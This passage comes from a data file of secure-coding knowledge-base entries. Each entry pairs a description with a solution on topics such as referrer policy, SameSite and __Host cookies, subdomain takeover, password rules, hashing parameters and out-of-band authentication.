and for navigations away from that document\nare associated with a Referer header. While the header can be suppressed for\nlinks with the noreferrer link type, authors might wish to control the Referer\nheader more directly for a number of reasons,\n\n Privacy\nA social networking site has a profile page for each of its users, \nand users add hyperlinks from their profile page to their favorite bands. \nThe social networking site might not wish to leak the user\u2019s profile URL \nto the band web sites when other users follow those hyperlinks \n(because the profile URLs might reveal the identity of the owner of the profile).\n\nSome social networking sites, however, might wish to inform the band web sites that\nthe links originated from the social networking site but not reveal which specific\nuser\u2019s profile contained the links.\n\n Security\nA web application uses HTTPS and a URLbased session identifier. The web application might\nwish to link to HTTPS resources on other web sites without leaking the user\u2019s session \nidentifier in the URL.\n\nAlternatively, a web application may use URLs which themselves grant some capability. \nControlling the referrer can help prevent these capability URLs from leaking via \nreferrer headers.\n\nNote that there are other ways for capability URLs to leak, and controlling \nthe referrer is not enough to control all those potential leaks.\n\n Trackback\nA blog hosted over HTTPS might wish to link to a blog hosted over HTTP and \nreceive trackback links.\n\n Solution:\n\nFor more information about the policy and how it should be implemented please\nvisit the following link,\n\nhttps://www.w3.org/TR/referrerpolicy/referrerpolicies\n"}, {"kb_id": 283, "title": "Insecure application defaults", "content": " Description:\n\nWhen default sample applications, default users, etc\nare not removed from your production environment you\nare increasing an attackers potentiall attack surface significantly.\n\n Solution:\n\nVerify that all unneeded features, documentation, samples, \nconfigurations are removed, such as sample applications, \nplatform documentation, and default or example users.\n"}, {"kb_id": 284, "title": "Infrastructure as code", "content": " Description:\n\nInfrastructure as code (IaC) is the process of managing and provisioning \napplications and infrastrucutre through machinereadable definition files, \nrather than physical hardware configuration or interactive configuration tools\n\n Solution:\n\nVerify that the application build and deployment processes are performed\nin a secure and repeatable way, such as CI / CD automation, automated \nconfiguration management, and automated deployment scripts.\n\nBy doing so your infrastructure and application deployment also becomes immutable\nand is easier to patch and maintain. Also, having your provisioning\nof the application/infrastructure as code also means it has versioning\nand other important benefits from having a versioning control system in place.\n\nOther great benifits are,\n\n Speed and simplicity\n  IaC allows you to spin up an entire infrastructure architecture by running a script.\n Configuration consistency\n  Standard operating procedures can help maintain some consistency in \n  the infrastructure deployment process\n Quick rollback\n  When a mistake or vulnerable peace of code has been pushed to a production environment\n  with IaC it is easy to roll back to a stable/secure version.\n"}, {"kb_id": 285, "title": "GraphQL security", "content": " Description:\n\nGraphQL is an opensource data query and manipulation language for APIs, \nand a runtime for fulfilling queries with existing data. GraphQL was \ndeveloped internally by Facebook in 2012 before being publicly released i\nn 2015. On 7 November 2018, the GraphQL project was moved from Facebook \nto the newlyestablished GraphQL foundation, hosted by the nonprofit Linux Foundation.\n\n Solution:\n\nVerify that GraphQL or other data layer authorization logic is be \nimplemented at the business logic layer instead of the GraphQL layer.\n"}, {"kb_id": 286, "title": "JSON validation schema", "content": " Description:\n\nJSON Schema is a vocabulary that allows you to annotate and validate JSON documents.\n\nWhen adding schema''s to your or JSON files you have better control over what\ntype of userinput can be supplied in your application. \nThis dramatically decreases an attacker\u2019s vector when implemented the right way. \nNonetheless, you should always apply your own input validation and rejection\nas an extra layer of defense. This approach is also desirable since you also \nwant to do countering and logging on the user\u2019s requests and input.\n\n Solution:\n\nVerify that JSON schema validation takes place to ensure a properly formed\nJSON request, followed by validation of each input field before any \nprocessing of that data takes place.\n"}, {"kb_id": 288, "title": "Serve files whitelist.", "content": " Description:\n\nConfigiring the web server to only serve files with an expected\nfile extension helps prevent information leakage whenever developers\nforget to remove backup files or zipped versions of the web application\nfrom the webserver.\n\n\n Solution:\n\nVerify that the web tier is configured to serve only files with specific\nfile extensions to prevent unintentional information and source\ncode leakage. For example, backup files (e.g. .bak), temporary working\nfiles (e.g. .swp), compressed files (.zip, .tar.gz, etc) and other extensions\ncommonly used by editors should be blocked unless required.\n"}, {"kb_id": 289, "title": "User supplied scriptable or expression template language content", "content": " Description:\n\nusersupplied scriptable or expression template language content, such as Markdown, \nCSS or XSL stylesheets, BBCode, or similar are designed to give users the option\nto add a lot of rich styling to the application. However whenever these templates \ndo not filter for harmfull attacks, these templates can be used to leverage\nXSS attacks.\n\n\n Solution:\n\nVerify that the application sanitizes, disables, or sandboxes \nusersupplied scriptable or expression template language content, such as Markdown, \nCSS or XSL stylesheets, BBCode, or similar.\n\nHow this is most effectively done depends on the framework and library you\nare choosing to incorperate. It is advised to investigate how to put up constraints\nfor translating these template syntaxes to HTML tags and what their security\nimplications are. \n"}, {"kb_id": 290, "title": "Replay attacks", "content": " Description:\nA replay attack (also known as playback attack) is a form of attack in which\na valid data transmission is maliciously or fraudulently repeated or delayed. \nThis is carried out either by the originator or by an adversary who intercepts the data and retransmits it.\nThis is one of the lower tier versions of a \"Maninthemiddle attack\".\n\n Solution:\nReplay attacks can be prevented by tagging each encrypted component with a session ID and a component number.\nUsing this combination of solutions does not use anything that is interdependent on one another. \nBecause there is no interdependency there are fewer vulnerabilities. This works because a unique, \nrandom session id is created for each run of the program thus a previous run becomes more difficult to replicate. \nIn this case an attacker would be unable to perform the replay because on a new run the session ID would have changed\n"}, {"kb_id": 291, "title": "Same site attribute", "content": " Description:\nSameSite prevents the browser from sending this cookie along with crosssite requests. \nThe main goal is mitigate the risk of crossorigin information leakage. It also provides some \nprotection against crosssite request forgery attacks.\n\n\n Solution:\nThe strict value will prevent the cookie from being sent by the browser to the target site in all \ncrosssite browsing context, even when following a regular link. For example, for a GitHublike website this would mean that if a loggedin user follows a link to a private GitHub project posted on a corporate discussion forum or email, GitHub will not receive the session cookie and the user will not be able to access the project.\n\nA bank website however most likely doesn''t want to allow any transactional pages to be linked from external sites so the strict flag would be most appropriate here.\n\nThe default lax value provides a reasonable balance between security and usability for websites that want to maintain user''s loggedin session after the user arrives from an external link. In the above GitHub scenario, the session cookie would be allowed when following a regular link from an external website while blocking it in  CSRFprone request methods (e.g. POST).\n\nAs of November 2017 the SameSite attribute is implemented in Chrome, Firefox, and Opera. \nSince version 12.1 Safari also supports this. Windows 7 with IE 11 lacks support as of December 2018, \nsee caniuse.com below.\n"}, {"kb_id": 292, "title": "Host prefix", "content": " Description:\n\nHardening of session cookies is possbile by using the ''__Host\" prefix. With this we can prevent the mis configuration of example the Path=/, Secure cookie and Domain attributes. \n\n\n Solution:\n\nThe ''__Host\" prefix signals to the browser that both the Path=/ and Secure attributes are required, \nand at the same time, that the Domain attribute may not be present."}, {"kb_id": 293, "title": "Race conditions", "content": " Description:\nA race condition is a flaw that produces an unexpected result when the timing of actions impact other actions. \nAn example may be seen on a multithreaded application where actions are being performed on the same data. \nRace conditions, by their very nature, are difficult to test for.\n\nRace conditions may occur when a process is critically or unexpectedly dependent on the sequence or timings of \nother events. In a web application environment, where multiple requests can be processed at a given time, \ndevelopers may leave concurrency to be handled by the framework, server, or programming language.\n\n Solution:\n\nOne common solution to prevent race conditions is known as locking. This ensures that at any given time, \nat most one thread can modify the database. Many databases provide functionality to lock a given row when a \nthread is accessing it.\n\n"}, {"kb_id": 294, "title": "Sub domain take over", "content": " Description:\n\nSubdomain takeover is a process of registering a nonexisting domain name to gain control over another domain. \n\nThe most common scenario of this process follows:\n\nDomain name (e.g., sub.example.com) uses a CNAME record to another domain (e.g., sub.example.com CNAME anotherdomain.com).\nAt some point in time, anotherdomain.com expires and is available for registration by anyone.\nSince the CNAME record is not deleted from example.com DNS zone, anyone who registers anotherdomain.com has full control over sub.example.com until the DNS record is present.\n\nThe implications of the subdomain takeover can be pretty significant. Using a subdomain takeover, attackers can send phishing emails from the legitimate domain, perform crosssite scripting (XSS), or damage the reputation of the brand which is associated with the domain. \n\nSource: https://0xpatrik.com/subdomaintakeoverbasics/\n\n Solution:\n\nAs an end user of a service, going through your organization''s DNS records in a routine manner or while discontinuing or terminating a service will safely remove it''s DNS records.\n\nAs a service provider, implementing stricter methods will prove (sub) domain ownership.\n"}, {"kb_id": 295, "title": "No password rotation policy", "content": " Description:\nSome policies require users to change passwords periodically, often every 90 or 180 days. \nThe benefit of password expiration, however, is debatable. Systems that implement such \npolicies sometimes prevent users from picking a password too close to a previous selection.\n\nThis policy can often backfire. Some users find it hard to devise \"good\" passwords that are \nalso easy to remember, so if people are required to choose many passwords because they have \nto change them often, they end up using much weaker passwords; the policy also encourages \nusers to write passwords down. Also, if the policy prevents a user from repeating a recent password, \nthis requires that there is a database in existence of everyone''s recent passwords (or their hashes) \ninstead of having the old ones erased from memory. Finally, users may change their password repeatedly\nwithin a few minutes, and then change back to the one they really want to use, circumventing the \npassword change policy altogether.\n\n Solution:\nOnly force users to update their passwords when the password strength that is enforced by the application\nis no longer sufficient to withstand brute force attacks due to increase of computing power.\n"}, {"kb_id": 296, "title": "User notification on critical state changing operations", "content": " Description:\nWhen a user is informed of critical operations than the user can determine\nif the notification is send by his own actions, or that the notifucation indicates \npotential compromitation of his user account.\n\n Solution:\n\nVerify that secure notifications are sent to users after updates\nto authentication details, such as credential resets, email or address changes,\nlogging in from unknown or risky locations. Users must also be notified when\npassword policies change or any other important updates that require action from the\nuser to increase the security of his account.\n\nThe use of push notifications  rather than SMS or email  is preferred, but in the \nabsence of push notifications, SMS or email is acceptable as long as no sensitive information is disclosed in the notification.\n"}, {"kb_id": 297, "title": "Stateless session tokens", "content": " Description:\n\nJSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and selfcontained way \nfor securely transmitting information between parties as a JSON object. This information can be verified and \ntrusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA.\n\nJSON Web Token is used to carry information related to the identity and characteristics (claims) of a client. This \"container\" is signed by the server in order to avoid that a client tamper it in order to change, for example, the identity or any characteristics (example: change the role from simple user to admin or change the client login).\n\nThis token is created during authentication (is provided in case of successful authentication) and is verified by the server before any processing. It is used by an application to allow a client to present a token representing his \"identity card\" (container with all information about him) to server and allow the server to verify the validity and integrity of the token in a secure way, all of this in a stateless and portable approach (portable in the way that client and server technologies can be different including also the transport channel even if HTTP is the most often used).\n\n Solution:\n\nFor more information about all the different implementation flaws for JWT please refer to:\n\nhttps://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/JSON_Web_Token_Cheat_Sheet_for_Java.md\n"}, {"kb_id": 298, "title": "GUID v4", "content": " Description:\nA universally unique identifier (UUID) is a 128bit number used to identify information in computer systems. \nThe term globally unique identifier (GUID) is also used, typically in software created by Microsoft.\n\n Solution:\nA version 4 UUID is randomly generated. As in other UUIDs, \n4 bits are used to indicate version 4, and 2 or 3 bits to indicate the variant \n(102 or 1102 for variants 1 and 2 respectively). Thus, for variant 1 (that is, most UUIDs) a \nrandom version4 UUID will have 6 predetermined variant and version bits, leaving 122 bits for \nthe randomly generated part, for a total of 2122, or 5.3\u00d71036 (5.3 undecillion) possible version4 \nvariant1 UUIDs. There are half as many possible version4 variant2 UUIDs (legacy GUIDs) because \nthere is one less random bit available, 3 bits being consumed for the variant.\n"}, {"kb_id": 299, "title": "Exception handling", "content": " Description:\nException handling is the process of responding to the occurrence, during computation, \nof exceptions \u2013 anomalous or exceptional conditions requiring special processing \noften disrupting the normal flow of program execution. It is provided by specialized \nprogramming language constructs, computer hardware mechanisms like interrupts or operating \nsystem IPC facilities like signals.\n\nIn general, an exception breaks the normal flow of execution and executes a preregistered \nexception handler. The details of how this is done depends on whether it is a hardware or \nsoftware exception and how the software exception is implemented. Some exceptions, \nespecially hardware ones, may be handled so gracefully that execution can resume where it was interrupted.\n\nAlternative approaches to exception handling in software are error checking, \nwhich maintains normal program flow with later explicit checks for contingencies \nreported using special return values or some auxiliary global variable \nsuch as C''s errno or floating point status flags; or input validation to preemptively \nfilter exceptional cases.\n\n Solution:\n\nBy catching all different errors and exceptions your program will never be redirected in a \nexcecution flow that causes unexpected behaviour. This behaviour could include bypassing authorization \nlogic or other sanity checks that could be used to attack the target system.\n\n"}, {"kb_id": 300, "title": "Back up data", "content": " Description:\nIn information technology, a backup, or data backup, or the process of backing up, \nrefers to the copying into an archive file of computer data that is already in \nsecondary storage so that it may be used to restore the original after a data loss event. \n\n Solution:\nBackups have two distinct purposes. The primary purpose is to recover data after its loss, \nbe it by data deletion or corruption. Data loss can be a common experience of computer users. \n\nThe secondary purpose of backups is to recover data from an earlier time, according to a \nuserdefined data retention policy, typically configured within a backup application for how \nlong copies of data are required. \n\nThough backups represent a simple form of disaster recovery \nand should be part of any disaster recovery plan, backups by themselves should not be considered\na complete disaster recovery plan. One reason for this is that not all backup systems are able to\nreconstitute a computer system or other complex configuration such as a computer cluster, \nactive directory server, or database server by simply restoring data from a backup.\n\nIn order to always poses over the latest state of your data it is recommended to do active syncing\nbetween the application server and the backup service. Also, try to not only write recovery policies \nbut also put them to the test regularly to verify the plans effective coverage in case if an incident.\n"}, {"kb_id": 301, "title": "Static code analysis", "content": " Description:\nStatic program analysis is the analysis of computer software that is performed without actually \nexecuting programs, in contrast with dynamic analysis, which is analysis performed on programs \nwhile they are executing.[1] In most cases the analysis is performed on some version of the source code, \nand in the other cases, some form of the object code.\n\nThe term is usually applied to the analysis performed by an automated tool, with human analysis being \ncalled program understanding, program comprehension, or code review. Software inspections and software \nwalkthroughs are also used in the latter case.\n\n Solution:\nThere are a lot of different static code analysis tools on the market, it is important to determine\nwhat tools are able to scan your code base. After having selectecd the right SAST tool we can start writing \ncustom rules that help identify security risks such as time functions, unsafe file operations and network connections.\n"}, {"kb_id": 302, "title": "TLS", "content": " Description:\n\nTransport Layer Security (TLS), and its nowdeprecated predecessor, Secure Sockets Layer (SSL),\nare cryptographic protocols designed to provide communications security over a computer network.\nSeveral versions of the protocols find widespread use in applications such as web browsing, email,\ninstant messaging, and voice over IP (VoIP). Websites can use TLS to secure all communications between their servers and web browsers.\n\nThe TLS protocol aims primarily to provide privacy and data integrity between two or more\ncommunicating computer applications.[2]:3 When secured by TLS, connections between a client \n(e.g., a web browser) and a server (e.g., wikipedia.org) should have one or more of the following properties:\n\nThe connection is private (or secure) because symmetric cryptography is used to encrypt the data transmitted. \nThe keys for this symmetric encryption are generated uniquely for each connection and are based on a shared \nsecret that was negotiated at the start of the session. The server and client negotiate \nthe details of which encryption algorithm and cryptographic keys to use before the first byte of data is transmitted. \nThe negotiation of a shared secret is both secure (the negotiated secret is unavailable to eavesdroppers and cannot be \nobtained, even by an attacker who places themselves in the middle of the connection) and reliable \n(no attacker can modify the communications during the negotiation without being detected).\n\nThe identity of the communicating parties can be authenticated using publickey cryptography. \nThis authentication can be made optional, but is generally required for at least one of the parties (typically the server).\n\nThe connection is reliable because each message transmitted includes a message integrity check using \na message authentication code to prevent undetected loss or alteration of the data during transmission.\n\nIn addition to the properties above, careful configuration of TLS can provide additional privacyrelated properties \nsuch as forward secrecy, ensuring that any future disclosure of encryption keys cannot be used to decrypt any TLS communications recorded in the past\n\n Solution: \n\nAlways use TLS everywhere and apply the best security configuration."}, {"kb_id": 303, "title": "Code signing", "content": " Description:\nCode signing is the process of digitally signing executables and scripts to confirm the software \nauthor and guarantee that the code has not been altered or corrupted since it was signed. \nThe process employs the use of a cryptographic hash to validate authenticity and integrity.\n\nCode signing can provide several valuable features. The most common use of code signing is to \nprovide security when deploying; in some programming languages, it can also be used to help prevent \nnamespace conflicts. Almost every code signing implementation will provide some sort of digital \nsignature mechanism to verify the identity of the author or build system, and a checksum to verify \nthat the object has not been modified. It can also be used to provide versioning information about an object or to store other meta data about an objec\n\n Solution:\nSign your code and validate the signatures(checksums) of your code and third party\ncomponents to confirm the integrity of the deployed components.\n"}, {"kb_id": 304, "title": "Secure random generators", "content": " Description:\nA cryptographically secure pseudorandom number generator (CSPRNG) or cryptographic pseudorandom\nnumber generator (CPRNG) is a pseudorandom number generator (PRNG) with properties that make it \nsuitable for use in cryptography.\n\nMost  applications require random numbers, for example:\n\n key generation\n nonces\n salts \n\n Solution:\nIdeally, the generation of random numbers in CSPRNGs uses entropy obtained from a highquality source. Most of the development frameworks have excellent functions for generating true secure random values.\n\nTo test the effective entropy of the generated token we can utilize the extensive analysis tool\nof \"Burpsuite community version\". more information in how to test your tokens effective entropy is found here:\n\nhttps://portswigger.net/burp/documentation/desktop/tools/sequencer\n"}, {"kb_id": 999, "title": "not available item", "content": " Description:\n\nThis item is currently not available.\n\n\n\n Solution:\n\nThis item is currently not available.\n"}, {"kb_id": 1337, "title": "Sensitive Information Exposure in URL", "content": " Description:\n\nIf the application logic transmits session IDs in the URL, their values could be leaked through the Referer header to thirdparty websites, logged by proxy servers, bookmarked in the browser, accidentally sent via emails or chats. \nWhenever the session ID is disclosed in the URL there might be also the possibility to perform other attacks (like session fixation) that lead to session hijacking.\n\n Solution:\n\nSession tokens should never be included in places other than the application Cookie header or other custom headers defined by the application.\n\n"}, {"kb_id": 1338, "title": "Sensitive Information Exposure in client Side Storage", "content": " Description:\n\nClientside storage (also known as offline storage or web storage) is a functionality provided by browsers to allow applications to save information on the user''s computer and retrieve them when necessary. \nSince this operations are performed by clientside scripting languages (notably Javascript), this information can be retrieved by thirdparty codes included in the webpages or by Crosssite scripting attacks (XSS) performed by attackers.\nMoreover, attackers with local privileges on the user''s machine are able to access these storages and possibly compromise the session of the users.\n\n Solution:\n\nSensitive data (like session tokens or Personal Identifiable Information) should never be stored in clientside storages. \nThis means to carefully verify that the application never saves at any time this kind of information in:\n* Local Storage\n* Session Storage\n* Web SQL\n* Cache Storage\n* Application Cache\n* IndexDB"}, {"kb_id": 1339, "title": "Session Token Generation After Login", "content": " Description:\n\nThe application should always generate a new session ID only after the user submits a set of valid credentials upon authentication.\nThis is meant to prevent an attacker from performing Session Fixation attacks against other users.\n\n Solution:\n\nVerify that session tokens are generated after a successfull authentication, not before. Please note also that these IDs should be unique and randomly generated.\n"}, {"kb_id": 1341, "title": "Secure Generation of Session Tokens", "content": " Description:\n\nThe application should always generate session IDs with a sufficient level of entropy.\nThe goal to use randomly generated values for tokens is that of preventing session collision or session hijacking. If an attacker can guess an authenticated user''s session identifier, he can take over the user''s session. Moreover, an attacker that breaks the algorithm logic behind the session IDs generation might be able to arbitrary craft valid session tokens for any user.\n\n\n Solution:\n\nVerify that session tokens are created using approved cryptographic algorithms with more than 64 bits of entropy. As a Developer you should rely on functionalities provided by the framework. If not present, always refer to Secure Random Number functions provided by the programming language libraries.\n"}, {"kb_id": 1342, "title": "Ensure Session Validation in Credential Service Provider and Relying Parties.md", "content": " Description:\n\nA Credential Service Provider (or Identity Provider) is an Identity Access Management entity that releases security tokens to users of specific services (called Relying Parties or Service Providers). An Identity Provider makes possible to authenticate the user to registered services without actually requiring them to login again for every application.\n\nWhen deploying a Credential Service Provider it is necessary to verify that the Credential Service Provider and Relying Parties handle the session management mechanisms in a secure way. \n\n Solution:\n\nTo ensure a properly implemented connection between the Identity Provider and the Relying Parties, it is necessary to validate the session management in both sides. In particular, the Relying Parties have to specify to the IdP the maximum authentication timeframe for inactive sessions. After this period, the IdP has to reauthenticate the subscriber (i.e. the user) again.\nOn the other hand, is up to the IdP to inform the Relying Parties of the last authentication event of a user. With this information, the Relying Parties can determine if they need to force the user to authenticate again.\n"}, {"kb_id": 1343, "title": "Permit Password Change", "content": "Description:\n\nUsers should be able to update their password whenever it is necessary. For example, take in consideration the scenario in which they tend to use the same password for multiple purposes. If this password is leaked, the users have to immediately update their credentials in every application they are registered. Therefore, if the application does not provide an accessible password update functionality to a user, there is the risk that his account may be taken over.\n\nSolution:\n\nApplications should provide to the user a functionality that permits the change of its own password.\n"}, {"kb_id": 1344, "title": "Provide Password Strength Checker", "content": " Description:\n\nUsers may tend to choose easy guessable passwords. Therefore, it is suggested to implement a functionality that encourage them to set password of higher complexity.\n\n Solution:\n\nApplications should provide the users a password security meter in occasion of account registration and password change.\n"}, {"kb_id": 1345, "title": "Verify Breached Passwords", "content": " Description:\n\nMultiple database of leaked credentials have been released during breaches over the years. If users choose passwords already leaked, they are vulnerable to dictionary attacks.\n\n Solution:\n\nVerify that passwords submitted during account registration, login, and password change are checked against a set of breached passwords. In case the password chosen has already been breached, the application must require the user to reenter a nonbreached password.\n"}, {"kb_id": 5000, "title": "Offline Attacks on Passwords", "content": " Description:\n\nPasswords stored locally are often vulnerable to offline attacks like dictionary attacks(list of commonly known passwords), bruteforce(permutation of all possible combinations) and rainbow tables(generate hashes upfront and do a look up for each hash). Since we belong to a generation of high speed computers performing these attacks is quite a trivial task for the attackers.\n\n\n Solution:\n\nThe most effective solution to eliminate offline attacks on password is to enforce the use of strong passwords and very prominently use industry recognized hashing algorithms with a salting mechanism. We hash passwords because in the event an attacker gets read access to our database, we do not want him to retrieve the passwords plain text. A salt is a nonsecret, unique value in the database which is appended (depending on the used algorithm) to the password before it gets hashed.\n\nSome of the well known hashing algorithms are as follows:\n\nMD5 (Crytographically Broken),\nSHA1 (Crytographically Broken),\nSHA2,\nSHA3,\nPBKDF2,\nbcrypt (defacto standard)\nand scrypt.\n"}, {"kb_id": 5001, "title": "Password Hash Salt Length", "content": " Description:\n\nFor secure storage of passwords, it is recommended to hash the passwords with a unique salt. A salt is a nonsecret, unique value in the database which is appended (depending on the used algorithm) to the password before it gets hashed. A salt is used to prevent Rainbow Table lookups (an attack where you compute a table of hashes for passwords). The length of a salt is critical to ensure true randomness and entropy amongst the hashed password and prevent collusion.\n\n\n Solution:\n\nEnsure the length of the salt is atleast 32bit, SHALL be generated by an approved random bit generator and chosen arbitrarily to minimize salt value collisions among stored hashes.\n"}, {"kb_id": 5002, "title": "PBKDF2 Iteration Count", "content": " Description:\n\nPBKDF2, is a function for creating a cryptographic key from a password. The aim of the function is to create a key in such a way that dictionary attacks (where the attacker just tries a range of possible passwords) are unfeasible. To do this, PBKDF2 applies a pseudorandom function (PRF) to the password many times. Additionally, the function can be given a \u201csalt\u201d parameter to make each key derivation operation unique. A developer using PBKDF2 must carefully choose parameter values for the salt, the PRF, and the number of iterations, i.e. the number of times the PRF will be applied to the password when deriving the key.\n\n\n Solution:\n\nA application developer using PBKDF2 should ensure the iteration count SHOULD be as large as verification server performance will allow, typically at least 100,000 iterations.\n"}, {"kb_id": 5003, "title": "Bcrypt Work Factor", "content": " Description:\n\nThe attraction of bcrypt is that you can tune its work factor to counter increases in computing technology, so that it''s very slow to bruteforce compared to an MD5/SHA/CRC, all of which are extremely fast to compute. When bcrypt was introduced, the cost factor was 6 for normal users and 8 for super users. Chances are you\u2019re just using the default bcrypt cost factor. Bcryptruby and most other implementations set this to 10, meaning 2^10 key expansion rounds. With advances in computing technology, it is highly recommended to tune the work factor cost periodically to combat brute force attacks.\n\n\n Solution:\n\nIf a developer uses bcrypt, they should ensure the work factor SHOULD be as large as verification server performance will allow, typically at least 13.\n"}, {"kb_id": 5100, "title": "OOB Unencrypted", "content": " Description:\n\nIn authentication, outofband refers to utilizing two separate networks or channels, one of which being different from the primary network or channel, simultaneously used to communicate between two parties or devices for identifying a user. A cellular network is commonly used for outofband authentication. An example of outofband authentication is when an online banking user is accessing their online bank account with a login and a one time password is sent to their mobile phone via SMS to identify them. The primary channel would be the online login screen where the user enters their login information and the second separate channel would be the cellular network. This added layer of security prevents the likelihood of hackers and malware from compromising access to the complete authentication process.\n\n\n Solution:\n\nThe most effective solution to eliminate the use of mediums such as unencrypted emails or VOIP and switch to more secure channels or implement mechanisms like mutual TLS authentication between the interacting parties where possible.\n"}, {"kb_id": 5101, "title": "Secure OOB Channel", "content": " Description:\n\nThe essential idea behind outofband authentication is that by using two different channels, authentication systems can guard against fraudulent users that may only have access to one of these channels. One of the most common examples of outofband authentication is in banking transactions. Typically, a customer wishing to do an online bank transaction will be sent an SMS message by cell phone with a password. This way, any hackers or identity thieves that have access through key loggers or other equipment will not be able to access that particular password, because it is sent over a 3G or 4G wireless network instead of being sent over the Internet.It is worthy to ensure the channel between the communicating parties is through a trusted and secure channel.\n\n\n Solution:\n\nThe most effective solution is to switch to a more secure channel and implement mechanisms like mutual TLS between the interacting parties where possible.\n"}, {"kb_id": 5102, "title": "OOB PIN Expiry", "content": " Description:\n\nIf an application allows the user to attempt for outofband authentication after a set time interval, it increases the chance of an attacker to replay a valid outofband authentication key after successfully compromising the session.\n\n\n Solution:\n\nThe most effective solution is to reject out of band authentication attempts after 10 minutes and also ensure the outofband authentication key can be used only once.\n"}, {"kb_id": 5103, "title": "OOB Key Used Once", "content": " Description:\n\nIf an application allows the user to attempt for outofband authentication using an old outofband authentication key, it increases the likelihood of replay attacks and can assist in comprising a user session.\n\n\n Solution:\n\nThe most effective solution is to reject out of band authentication attempts after 10 minutes and also ensure the outofband authentication key can be used only once. The system providing outofband authentication keying material should discard the key once it used.\n"}, {"kb_id": 6900, "title": "Unsafe password reset", "content": " Description:\n\nSending passwords or activation key''s in clear text exposes sensitive information. \n\n Solution:\n\nIt is best practice to send a unique url or an URL with a unique parameter that allows the user to be re(activated).\nMake sure the URL expires in a reasonable time and the URL/parameter becomes invalid once the user has been reactivated.\n"}, {"kb_id": 6901, "title": "Presence of Knowledge", "content": " Description:\n\nAvoid the use of knowledgebasedanswers(socalled \"secret questions\").\nDue to the predominant use of social media, the power of Internet search engines, and access to public records via the Internet, your personal information is only be a few keystrokes away, \nallowing an attacker to reset your password or recover sensitive information.\n\n Solution:\n\nAs an alternative use verification by phone where the user has to send you the unique key he has received or \nimplement the use of a one time password service like google authenticator.\n"}, {"kb_id": 6902, "title": "Current Password Exposure", "content": " Description:\n\nThe recovery of cedentials should never reveal or send the current password to the user.\n\n Solution:\n\nIt is best practice to send a unique url or an URL with a unique parameter that allows the user to create new credentials.\nMake sure the URL expires in a reasonable time and the URL/parameter becomes invalid once the user has been reactivated.\nIn addition please note that passwords should not be stored in clear text in the database of an application. Instead it is best practice to store password hashes en verify the hashes when authenticating the user.\n"}, {"kb_id": 6903, "title": "Implement Two Factor Authentication for Password Recovery", "content": " Description:\n\nTo verify the user is who he claims to be in order to recover a forgotten password a two factor authentication mechanism should be implemented.\n\n Solution:\n\nTo verify forgotten password, and other recovery paths, use a TOTP (Time Based One Time Password) like google authenticator or other soft token, mobile push, or another offline recovery mechanism.\n"}, {"kb_id": 6904, "title": "Identity Spoofing", "content": " Description:\n\nIt is important to uniquely identify the users of an application for traceability. Therefore it should not be possible to use shared accounts,\nnor should it be possible to rebind identities to a different identity (spoofing)\n\n Solution:\n\nVerify identities cannot be rebound to a different identity and shared accounts are not present (\"root\", \"admin\", or \"sa\").\nAdministrative accounts like root, admin, sa,... should not be shared, should be renamed and should not be exposed to the front end of the application.\n"}, {"kb_id": 6905, "title": "Multifcator Authentication Exposure", "content": " Description:\n\nOnce a multifactore authentication factor is lost, damaged, or not working, it is important that identity proofing and binding is performed at the same level as during enrollment.\n\n Solution:\n\nImplement a sign in using alternative methods of authentication like verifying the identity using the email and \nphone that are registered with the user''s account. \nOnce replaced, the verifier MAY use a single factor to rebind the account to the new factor.\n"}, {"kb_id": 6906, "title": "Authentication Factor Notification", "content": " Description:\n\nThe user should be aware of any changes to his multiplefactor authentication.\n\n Solution:\n\nVerify that if an authentication factor is changed or replaced (something you \"know\", like a PIN code or something you \"have\" like a hardware token), \nthat the user is notified of this event.\n"}, {"kb_id": 6907, "title": "MinimumPasswordLength", "content": " Description:\n\nMinimum password length\n\n Solution:\n\nWith the current GPU power a passwords needs to be at least 12 characters in length. \n"}, {"kb_id": 6908, "title": "PermitLongPasswords", "content": " Description:\n\nPasswords of at least 64 characters should be allowed. \nThe use of password managers should be encouraged and supported by ensuring users can paste into password data entry fields, \nthereby enabling the automated use of password managers. \n\n Solution:\n\nVerify that passwords of 64 characters or longer are permitted.\n"}, {"kb_id": 6909, "title": "Permit Spaces In Passwords", "content": " Description:\n\n\tBy allowing spaces in passwords, a password can become a passphrase which is almost impossible to crack as long as it is not a common or popular quote.\n\tAlso adding spaces in a password increases the entropy of your password.\n\n Solution:\n\t\n\tVerify that passwords can contain spaces and truncation is not performed. Consecutive multiple spaces MAY optionally be coalesced.\n"}, {"kb_id": 6910, "title": "Permit Unicode Characters In Passwords", "content": " Description:\n\n\tWe remember visual information quicker and better comparing to text so a more complex password can be easely remembered.\n\tFor the moment password crackers don''t consider Emoji''s and kanji characters in their tools, but even if they would (and will in the near future),\n        using even a single Emoji in addition to a characters or/and numbers makes the range of possible passwords wider, which means it becomes harder to hack.\n\n Solution:\n\t\n\tVerify that Unicode characters are permitted in passwords. \n\tA single Unicode code point is considered a character, so 8 emoji or 64 kanji characters should be valid and permitted.\n"}, {"kb_id": 6911, "title": "Change And Validate Current Password", "content": " Description:\n\n\tThe user should be the only one who knows his password, so if an administrator provides the initial password, \n\tthe user should be able to change his password. Also when a user believes the current password has \n\tbeen (or might have been) compromised, or as a precautionary measure the user must be able to change his password. \t\n\tWhen a user changes his password, his current password should be validated. \n\tThis prevents an attacker that is able to take control of a valid session, to easily change the victim''s password.\n\n Solution:\n\t\n\tVerify users can change their password, and the change validates the current secret.\n"}, {"kb_id": 6912, "title": "List of compromised passwords", "content": " Description:\n\n\tThe application should compare the new prospective password against a list that contains values known to be commonlyused, expected, or compromised. \n\n Solution:\n\t\n\tVerify that new or changed passwords are validated against a list of compromised secrets, \n\tand if found to be compromised, the user is prompted to choose another secret.\n\tYou can include pasword list as the ones found here https://wiki.skullsecurity.org/Passwords and/or\n\tuse an API that provides a list of compromised secrets as can be found here https://haveibeenpwned.com/API/v2\n"}, {"kb_id": 6913, "title": "Password Strength Indicator", "content": " Description:\n\n\tPassword strength meters are intended to motivate users to create stronger passwords in the interest of \n\ttightening security. The motivating effect is especially high when showing a score numerically and relative \n\tto other users.\n\n Solution:\n\t\n\tVerify that a password strength meter/indicator is provided to help users set a stronger secret.\n"}, {"kb_id": 6914, "title": "No Character type limitation", "content": " Description:\n\n\tThe application should allow and not limit or enforce the type of characters that are permitted. \n\tMoreover, the application should enable the user to make pass phrases containng any usable character and \n\ttherefore strengthen security. \n\n Solution:\n\t\n\tVerify that there are no 